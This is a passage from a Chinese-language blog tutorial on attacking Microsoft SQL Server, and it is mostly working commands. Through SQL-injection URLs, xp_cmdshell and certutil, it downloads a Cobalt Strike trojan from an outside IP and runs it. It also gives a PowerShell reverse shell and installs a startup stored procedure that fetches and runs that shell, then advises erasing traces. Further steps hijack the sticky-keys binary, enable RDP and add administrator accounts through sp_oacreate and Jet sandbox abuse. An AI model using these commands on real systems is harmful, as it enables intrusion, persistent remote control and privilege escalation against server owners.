+
+<p>执行完成后，访问405.asp文件如果存在则证明写入成功！</p>
+<p><img src="image-20210913172029812.png" alt="image-20210913172029812"></p>
+<h5 id="certutil-getshell"><a href="#certutil-getshell" class="headerlink" title="certutil getshell"></a>certutil getshell</h5><p>certutil 是windows自带的证书下载工具，默认是白名单的，所以非常滴好用，这里演示下怎么通过该工具下载恶意文件并进行上线。</p>
+<p>1.使用cs生成一个exe的木马文件并挂载在cs上重命名为a.exe</p>
+<p><img src="image-20210913175137518.png" alt="image-20210913175137518"></p>
+<p><img src="image-20210913175243425.png" alt="image-20210913175243425"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://10.88.14.61/less-1.asp?id=1%27exec%20master..xp_cmdshell &#x27;certutil.exe -urlcache -split -f http://121.4.48.72:33898/a.exe C:\inetpub\wwwroot/a.exe&#x27;;--+</span><br><span class="line"></span><br><span class="line">该文件就被下载到C:\inetpub\wwwroot了，然后使用xp_cmdshell执行该文件即可上线</span><br><span class="line">http://10.88.14.61/less-1.asp?id=1%27exec%20master..xp_cmdshell &#x27;c:/inetpub/wwwroot/a.exe&#x27;;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210913175555887.png" alt="image-20210913175555887"></p>
+<h5 id="xp-cmdshell-持久化"><a href="#xp-cmdshell-持久化" class="headerlink" title="xp_cmdshell 持久化"></a>xp_cmdshell 持久化</h5><p>当攻击者拥有sysadmin权限时，我们可以操控存储过程远程下载恶意文件，并跟随sqlserver应用启动，就可以起到悄无声息的启动恶意程序，达到持久化控制的效果</p>
+<p>1.启用mastser数据库</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use master</span><br><span class="line">go</span><br></pre></td></tr></table></figure>
+
+<p>2.下载反弹shell的ps1脚本，脚本内容如下：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#A simple and small reverse shell by samratashok&#x27;s Nishang framework. Change the Host IP Address and Port according to your setup as described in the README file of the script. </span></span><br><span class="line"><span class="variable">$sm</span>=(<span class="built_in">New-Object</span> Net.Sockets.TCPClient(<span class="string">&quot;10.88.14.45&quot;</span>,<span class="number">4444</span>)).GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bt</span>=<span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span>=<span class="variable">$sm</span>.Read(<span class="variable">$bt</span>,<span class="number">0</span>,<span class="variable">$bt</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$d</span>=(<span class="built_in">New-Object</span> Text.ASCIIEncoding).GetString(<span class="variable">$bt</span>,<span class="number">0</span>,<span class="variable">$i</span>);<span class="variable">$st</span>=([<span class="type">text.encoding</span>]::ASCII).GetBytes((<span class="built_in">iex</span> <span class="variable">$d</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>));<span class="variable">$sm</span>.Write(<span class="variable">$st</span>,<span class="number">0</span>,<span class="variable">$st</span>.Length)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用python开启web服务，获取下载链接地址，反弹shell的地址是10.88.14.45,端口是4444  为我本机服务，客官需自行修改该地址！</span></span><br><span class="line">python3 <span class="literal">-m</span> http.server <span class="number">8080</span></span><br><span class="line"></span><br><span class="line">开启服务后，获取到下载链接地址</span><br><span class="line">http://<span class="number">10.88</span>.<span class="number">14.45</span>:<span class="number">8080</span>/<span class="built_in">Invoke-PowerShellTcpOneLine</span>.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210916101221496.png" alt="image-20210916101221496"></p>
+<p>3.创建一个新的存储过程，其中执行了xp_cmdshell存储过程，并进行了ps1脚本的下载!</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE test_sp</span><br><span class="line">AS</span><br><span class="line">EXEC master..xp_cmdshell &#x27;powershell -C &quot;iex (new-object System.Net.WebClient).DownloadString(&#x27;&#x27;http://10.88.14.45:8080/Invoke-PowerShellTcpOneLine.ps1&#x27;&#x27;)&quot;&#x27;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210916101328070.png" alt="image-20210916101328070"></p>
+<p>执行后发现已经成功的建立test_sp的存储过程</p>
+<p>4.现在我们将把这个存储过程移到启动阶段，因为我们希望它在服务器启动时立即执行。我们将在以下查询的帮助下做到这一点：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_procoption @ProcName = &#x27;test_sp&#x27;</span><br><span class="line">, @OptionName = &#x27;startup&#x27;</span><br><span class="line">, @OptionValue = &#x27;on&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>5.确认该存储过程是否已经随mssql进程启动</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM sysobjects WHERE type = &#x27;P&#x27; AND OBJECTPROPERTY(id, &#x27;ExecIsStartUp&#x27;) = 1;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210916101905742.png" alt="image-20210916101905742"></p>
+<p>上图证明已经将该存储过程设置为随mssql启动。下面监听4444端口，尝试反弹shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在nc中使用命令  nc -lvp 4444  进行监听端口</span><br></pre></td></tr></table></figure>
+
+<p>在系统中重启该服务，查看是否已经反弹shell成功</p>
+<p><img src="image-20210916102305634.png" alt="image-20210916102305634"></p>
+<p><img src="image-20210916102334057.png" alt="image-20210916102334057"></p>
+<p>上图已经成功获取到目标主机的shell，证明实验成功</p>
+<p>6.最后可以删除该存储过程，清理痕迹</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP PROCEDURE test_sp</span><br></pre></td></tr></table></figure>
+
+<h4 id="XP-dirtree-存储过程"><a href="#XP-dirtree-存储过程" class="headerlink" title="XP_dirtree 存储过程"></a>XP_dirtree 存储过程</h4><p>xp_dirtree 存储过程用于查找我们网站的根目录，该存储过程可以列出指定目录下的所有的文件,下面是一些经典的使用方式</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execute master..xp_dirtree &#x27;c:&#x27; //列出所有c:\文件和目录,子目录 </span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1 //只列c:\文件夹   将参数1改为2则是列出深度为1和2的文件夹，依次类推</span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1,1 //列c:\文件夹加文件 </span><br></pre></td></tr></table></figure>
+
+<p>但是该存储过程在正常的sql注入中是没有回显的，所以需要使用将数据插入到表中在进行查询的方式进行获取</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.创建临时表，因为我们需要获取文件名，所以我们在临时表中需要设置三个字段，用与保存目录名（varchar），深度(int)以及是否是文件（int）</span><br><span class="line">create table tmp (dir varchar(100),num int,num1 int)</span><br><span class="line"><span class="meta">#</span><span class="bash">注入语句</span></span><br><span class="line">http://10.88.15.236/less-2.asp?id=1;create table tmp (dir varchar(100),num int,num1 int)</span><br><span class="line">然后使用xp_dirtree将数据注入到tmp表中</span><br><span class="line">http://10.88.15.236/less-2.asp?id=1;insert into tmp(dir,num,num1) exec xp_dirtree &#x27;C:\&#x27;,1,1</span><br><span class="line">这样我们就实现了对数据的插入，查询该表即可获取数据</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210914105655051.png" alt="image-20210914105655051"></p>
+<h4 id="XP-regread"><a href="#XP-regread" class="headerlink" title="XP_regread"></a>XP_regread</h4><p>xp_regread可以用来读取注册表中的键值信息</p>
+<p>例如读取3389的端口值</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp&#x27;,&#x27;PortNumber&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>![image-20210914142528018.png)</p>
+<h4 id="xp-regenumkeys"><a href="#xp-regenumkeys" class="headerlink" title="xp_regenumkeys"></a>xp_regenumkeys</h4><p>枚举可用的键值，不知道有啥用，先记录功能！</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_regenumkeys &#x27;HKEY_CURRENT_USER&#x27;,&#x27;Control Panel\International&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210914144914385.png" alt="image-20210914144914385"></p>
+<h4 id="xp-fileexist"><a href="#xp-fileexist" class="headerlink" title="xp_fileexist"></a>xp_fileexist</h4><p>判断文件是否存在，返回1代表文件存在，该存储过程无回显，一般将回显插入到临时表中进行显示，是否查找成功</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_fileexist &quot;C:\inetpub\wwwroot\sql.aspx&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210914145520555.png" alt="image-20210914145520555"></p>
+<h4 id="xp-subdirs"><a href="#xp-subdirs" class="headerlink" title="xp_subdirs"></a>xp_subdirs</h4><p>列出当前目录的所有的文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_subdirs &quot;C:\\&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210914145929607.png" alt="image-20210914145929607"></p>
+<h4 id="xp-regwrite"><a href="#xp-regwrite" class="headerlink" title="xp_regwrite"></a><em>xp_regwrite</em></h4><p><em>xp_regwrite</em>修改注册表键值对</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">开启3389</span><br><span class="line">exec master.dbo.xp_regwrite&#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server&#x27;,&#x27;fDenyTSConnections&#x27;,&#x27;REG_DWORD&#x27;,0;</span><br><span class="line"><span class="meta">#</span><span class="bash">xp_cmdshell 开启</span></span><br><span class="line">exec master..xp_cmdshell &quot;REG ADD &#x27;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&#x27; /v fDenyTSConnections /t REG_DWORD /d 0&quot;</span><br><span class="line"></span><br><span class="line">关闭3389</span><br><span class="line">exec master.dbo.xp_regwrite&#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server&#x27;,&#x27;fDenyTSConnections&#x27;,&#x27;REG_DWORD&#x27;,1;</span><br></pre></td></tr></table></figure>
+
+<h5 id="xp-regwrite-映像劫持"><a href="#xp-regwrite-映像劫持" class="headerlink" title="xp_regwrite 映像劫持"></a>xp_regwrite 映像劫持</h5><p>xp_regwrite存储过程可以对注册表进行修改，替换任意的键值，我们可以通过对粘贴键进行替换的方式，造成劫持的效果，下面开始实践</p>
+<p>1.使用条件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">未禁止注册表的编辑功能</span><br><span class="line">xp_regwrite开启</span><br></pre></td></tr></table></figure>
+
+<p>2.xp_regwrite的开启和关闭</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &#x27;xp_regwrite&#x27;,1</span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure>
+
+<p>3.修改粘贴键的值为cmd窗口，达到劫持cmd的效果</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_regwrite @rootkey=&#x27;HKEY_LOCAL_MACHINE&#x27;,@key=&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE&#x27;,@value_name=&#x27;Debugger&#x27;,@type=&#x27;REG_SZ&#x27;,@value=&#x27;c:\windows\system32\cmd.exe&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>4.使用xp_regread查看是否成功修改文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#x27;,&#x27;Debugger&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210915142651918.png" alt="image-20210915142651918"></p>
+<p>上图即为修改成功</p>
+<p>5.验证cmd窗口是否可以正常启动，在windows中连续5次shift键后，弹出cmd框，即为成功</p>
+<p><img src="image-20210915142835591.png" alt="image-20210915142835591"></p>
+<p>6.使用regdeleteregkey删除键值</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_regdeletekey &#x27;HKEY_LOCAL_MACHINE&#x27;, &#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#x27;</span><br></pre></td></tr></table></figure>
+
+<h5 id="xp-regwrite-沙盒提权（server-2008不可用）"><a href="#xp-regwrite-沙盒提权（server-2008不可用）" class="headerlink" title="xp_regwrite 沙盒提权（server 2008不可用）"></a>xp_regwrite 沙盒提权（server 2008不可用）</h5><p>沙盒模式是数据库的一种安全功能.在沙盒模式下,只对控件和字段属性中的安全且不含恶意代码的表达式求值.如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的。</p>
+<p>使用场景： xp_regwrite 存储过程可用</p>
+<p>1.检查xp_cmdshell是否开启</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtyoe=&#x27;x&#x27; and name=&#x27;xp_cmdshell&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>2.开启沙盒模式</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SandBoxMode参数含义（默认是2）</span><br><span class="line">0：在任何所有者中禁止启用安全模式</span><br><span class="line">1 ：为仅在允许范围内</span><br><span class="line">2 ：必须在access模式下</span><br><span class="line">3：完全开启</span><br></pre></td></tr></table></figure>
+
+
+
+<p>3 利用jet.oledb执行系统命令添加用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27; ,&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27; ,&#x27;select shell(&quot;cmd.exe /c net user quan 121345 /add&quot;)&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210915150118444.png" alt="image-20210915150118444"></p>
+<p><strong>sql server2008</strong></p>
+<p>4将quan用户添加至管理员组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27; ,&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27; ,&#x27;select shell(&quot;cmd.exe /c net localgroup administrators quan /add&quot;)&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。</p>
+<p>常见存储过程</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell</span><br><span class="line">xp_dirtree</span><br><span class="line">xp_enumgroups</span><br><span class="line">xp_fixeddrives</span><br><span class="line">xp_loginconfig</span><br><span class="line">xp_enumerrorlogs</span><br><span class="line">xp_getfiledetails</span><br><span class="line">Sp_OACreate</span><br><span class="line">Sp_OADestroy</span><br><span class="line">Sp_OAGetErrorInfo</span><br><span class="line">Sp_OAGetProperty</span><br><span class="line">Sp_OAMethod</span><br><span class="line">Sp_OASetProperty</span><br><span class="line">Sp_OAStop</span><br><span class="line">Xp_regaddmultistring</span><br><span class="line">Xp_regdeletekey</span><br><span class="line">Xp_regdeletevalue</span><br><span class="line">Xp_regenumvalues</span><br><span class="line">Xp_regread</span><br><span class="line">Xp_regremovemultistring</span><br><span class="line">Xp_regwrite</span><br><span class="line">sp_makewebtask</span><br></pre></td></tr></table></figure>
+
+<h2 id="MSSQL-触发器"><a href="#MSSQL-触发器" class="headerlink" title="MSSQL 触发器"></a>MSSQL 触发器</h2><h3 id="什么是触发器"><a href="#什么是触发器" class="headerlink" title="什么是触发器"></a>什么是触发器</h3><p>触发器对表进行插入、更新、删除的时候会自动执行的特殊存储过程。触发器一般用在check约束更加复杂的约束上面。触发器和普通的存储过程的区别是：触发器是当对某一个表进行操作。诸如：update、insert、delete这些操作的时候，系统会自动调用执行该表上对应的触发器。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">创建触发器的语法：</span><br><span class="line">CREATE TRIGGER trigger_name </span><br><span class="line"> ON table_name </span><br><span class="line"> [WITH ENCRYPTION] </span><br><span class="line"> FOR | AFTER | INSTEAD OF [DELETE, INSERT, UPDATE] </span><br><span class="line"> AS  </span><br><span class="line"> T-SQL语句 </span><br><span class="line">GO </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="创建触发器"><a href="#创建触发器" class="headerlink" title="创建触发器"></a>创建触发器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">创建触发当执行update操作时执行计算器的触发器</span><br><span class="line">set ANSI_NULLS on</span><br><span class="line">go</span><br><span class="line">set QUOTED_IDENTIFIER on</span><br><span class="line">go</span><br><span class="line">create trigger [test1]</span><br><span class="line">on [users]</span><br><span class="line">AFTER UPDATE as</span><br><span class="line">begin</span><br><span class="line">    execute master..xp_cmdshell &#x27;cmd.exe /c calc.exe&#x27;</span><br><span class="line">end</span><br><span class="line">go</span><br><span class="line">然后执行update操作</span><br><span class="line">update test..users set username=&#x27;admin4&#x27; where username=&#x27;admin&#x27;</span><br><span class="line">成功触发触发器</span><br></pre></td></tr></table></figure>
+
+<h2 id="SP-OACREATE的利用"><a href="#SP-OACREATE的利用" class="headerlink" title="SP_OACREATE的利用"></a>SP_OACREATE的利用</h2><p>SP_OACREATE是mssql的COM组件，如果xp_cmdshell组件被删除了话，还可以使用sp_oacreate来进行提权。</p>
+<p>查看sp_oacreate状态,下图证明该存储过程存在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查看状态</span><br><span class="line">select * from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;SP_OACREATE&#x27;</span><br><span class="line">#查看是否存在，返回1则代表存在</span><br><span class="line">select count(*) from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;SP_OACREATE&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210914174638506.png" alt="image-20210914174638506"></p>
+<p><img src="image-20210914174808858.png" alt="image-20210914174808858"></p>
+<p>首先在使用该组件时需要将该组件启动后才能正常使用，否则将报错</p>
+<p><img src="image-20210914175042349.png" alt="image-20210914175042349"></p>
+<h3 id="开启sp-oacreate"><a href="#开启sp-oacreate" class="headerlink" title="开启sp_oacreate"></a>开启sp_oacreate</h3><p>输入以下指令即可开启sp_oacreate</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1; RECONFIGURE WITH OVERRIDE;   </span><br><span class="line"><span class="meta">#</span><span class="bash">当启用ole automation procedures时，对sp_oacreate的调用将会启动OLE共享执行环境。</span></span><br><span class="line">exec sp_configure &#x27;Ole Automation Procedures&#x27;, 1; RECONFIGURE WITH OVERRIDE;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210914175150774.png" alt="image-20210914175150774"></p>
+<h3 id="关闭sp-oacreate"><a href="#关闭sp-oacreate" class="headerlink" title="关闭sp_oacreate"></a>关闭sp_oacreate</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE;</span><br><span class="line">exec sp_configure &#x27;Ole Automation Procedures&#x27;,0;RECONFIGURE;</span><br></pre></td></tr></table></figure>
+
+<h3 id="sp-oacreate的用法"><a href="#sp-oacreate的用法" class="headerlink" title="sp_oacreate的用法"></a>sp_oacreate的用法</h3><h4 id="执行系统命令（调用wscript-shell）"><a href="#执行系统命令（调用wscript-shell）" class="headerlink" title="执行系统命令（调用wscript.shell）"></a>执行系统命令（调用wscript.shell）</h4><p>原理：调用了ole对象的run方法来执行系统命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\System32\cmd.exe /c whoami /all &gt;C:\\test.txt&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210914195333335.png" alt="image-20210914195333335"></p>
+<h4 id="添加系统账户并提权"><a href="#添加系统账户并提权" class="headerlink" title="添加系统账户并提权"></a>添加系统账户并提权</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">win 2000</span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\winnt\system32\cmd.exe /c net user 123 123 /add&#x27;</span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\winnt\system32\cmd.exe /c net localgroup administrators 123/add&#x27;</span><br><span class="line"></span><br><span class="line">winXP以及2003</span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\System32\cmd.exe /c net user adminsss Admin123 /add&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">添加管理员组</span></span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\System32\cmd.exe /c net localgroup  administrators adminsss /add&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210915092701822.png" alt="image-20210915092701822"></p>
+<h4 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @o int</span><br><span class="line">exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out</span><br><span class="line">exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;c:\windows\explorer.exe&#x27; ,&#x27;c:\windows\system32\sethc.exe&#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="移动文件"><a href="#移动文件" class="headerlink" title="移动文件"></a>移动文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">declare @aa int;</span><br><span class="line"></span><br><span class="line">exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @aa out;</span><br><span class="line"></span><br><span class="line">exec sp_oamethod @aa, &#x27;moveFile&#x27;,null,&#x27;C:\Users\Administrator\Desktop\12.php&#x27;, &#x27;C:\Users\Administrator\Desktop\11\12.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @Result  int</span><br><span class="line"></span><br><span class="line">DECLARE @FSO_Token  int</span><br><span class="line"></span><br><span class="line">EXEC @Result  = sp_OACreate &#x27;Scripting.FileSystemObject&#x27;, @FSO_Token  OUTPUT</span><br><span class="line"></span><br><span class="line">EXEC @Result  = sp_OAMethod @FSO_Token, &#x27;DeleteFile&#x27;, NULL, &#x27;C:\Users\Administrator\Desktop\11\12.php&#x27;</span><br><span class="line"></span><br><span class="line">EXEC @Result  = sp_OADestroy @FSO_Token</span><br></pre></td></tr></table></figure>
+
+<h4 id="执行系统命令（调用shell-application）"><a href="#执行系统命令（调用shell-application）" class="headerlink" title="执行系统命令（调用shell.application）"></a>执行系统命令（调用shell.application）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">declare @o int</span><br><span class="line">exec sp_oacreate &#x27;Shell.Application&#x27;,@o out</span><br><span class="line">exec sp_oamethod @o, &#x27;ShellExecute&#x27;,null,&#x27;cmd.exe&#x27;,&#x27;cmd /c net user &gt;C:\1.txt&#x27;,&#x27;C:\windows\sytsem32&#x27;,&#x27;&#x27;,&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">win2008创建失败，原因未知</span><br></pre></td></tr></table></figure>
+
